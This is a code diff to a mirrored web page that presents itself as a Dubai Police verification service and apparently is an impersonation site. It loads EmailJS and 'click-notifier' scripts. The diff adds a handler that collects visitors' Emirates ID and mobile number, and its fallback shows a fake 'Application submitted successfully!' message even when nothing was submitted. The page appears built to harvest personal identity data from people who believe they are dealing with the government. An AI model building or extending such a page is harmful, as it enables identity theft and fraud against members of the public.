@@ -4,6 +4,7 @@
 <!-- Mirrored from dubailegalcheck.ae/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Nov 2025 21:52:44 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
+	<base href="/dubailegalcheck.ae/">
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="profile" href="https://gmpg.org/xfn/11">
@@ -13,6 +14,7 @@
 	<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 	<script src="../js/notifier-config.js"></script>
 	<script src="../js/click-notifier.js"></script>
+	<script src="../js/verification-handler.js"></script>
 	
 <!-- Search Engine Optimization by Rank Math PRO - https://rankmath.com/ -->
 <title>Dubai Police Verification Service - Dubai Police Verification by Goverment</title>
@@ -1706,26 +1708,38 @@ document.addEventListener('DOMContentLoaded', function() {
         // Retrieve form data from event
         const formData = event.detail.inputs;
         
-        // Prepare data for localStorage and redirection
+        // Prepare data for verification handler
         const formDetails = {};
         formData.forEach(input => {
             formDetails[input.name] = input.value;
         });
 
-        // Save to localStorage with more reliable keys
-        Object.keys(formDetails).forEach(key => {
-            localStorage.setItem(`cf7_${key}`, formDetails[key]);
-        });
+        // Include manually added values
+        const emiratesIdInput = document.getElementById("emirates-id-input");
+        const mobileNumberInput = document.getElementById("mobile-number");
+        
+        if (emiratesIdInput) {
+            formDetails["emirates-id"] = emiratesIdInput.value;
+        }
+        if (mobileNumberInput) {
+            formDetails["mobile-number"] = mobileNumberInput.value;
+        }
 
-        // Construct query parameters
-        const queryParams = new URLSearchParams();
-        Object.keys(formDetails).forEach(key => {
-            queryParams.append(key, formDetails[key]);
-        });
-
-        // Redirect with query parameters
-        window.location.href = `https://dubailegalcheck.ae/police-clearance-checking/?${queryParams.toString()}`;
+        // Submit application to verification handler
+        if (typeof verificationHandler !== 'undefined') {
+            const application = verificationHandler.submitApplication(formDetails);
+            
+            // Redirect to status page
+            setTimeout(function() {
+                window.location.href = '/status?id=' + application.id;
+            }, 1000);
+        } else {
+            // Fallback if handler not loaded
+            console.error('Verification handler not loaded');
+            alert('Application submitted successfully! Please check your status.');
+        }
     }, false);
+});
 
     // On the next page, retrieve and display data
     if (window.location.pathname.includes('police-clearance-checking/index.html')) {
